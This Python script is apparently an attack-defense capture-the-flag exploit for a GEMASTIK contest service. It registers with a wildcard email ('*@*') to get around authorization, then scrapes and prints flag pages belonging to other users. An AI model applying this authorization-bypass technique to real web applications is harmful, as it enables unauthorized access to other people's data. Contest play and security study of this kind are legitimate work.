#!/usr/bin/env python3
import sys
import requests
import json
import re
import random
import string
# from submitter import submit

# host = "10.100.101.102"
# host = "localhost"
host = sys.argv[1]
port = 10000

flag_regex = r"GEMASTIK{[0-9a-fA-F]+}"

email = "*@*"
password = "test"

def exploit(host=host):
    url = f"http://{host}:{port}/"

    s = requests.Session()
    r = s.post(url + "auth/register", json={"email": email, "password": password})
    r = s.post(url + "auth/login", json={"email": email, "password": password})
    r = s.get(url + "kode")

    urls_with_flags = re.findall(r'href="([^"]*flag_\w+[^"]*)"', r.text)
    for url_with_flag in urls_with_flags:
        r = s.get(url + url_with_flag[1:])
        print(re.search(flag_regex, r.text).group(), flush=True)

if __name__ == "__main__":
    exploit()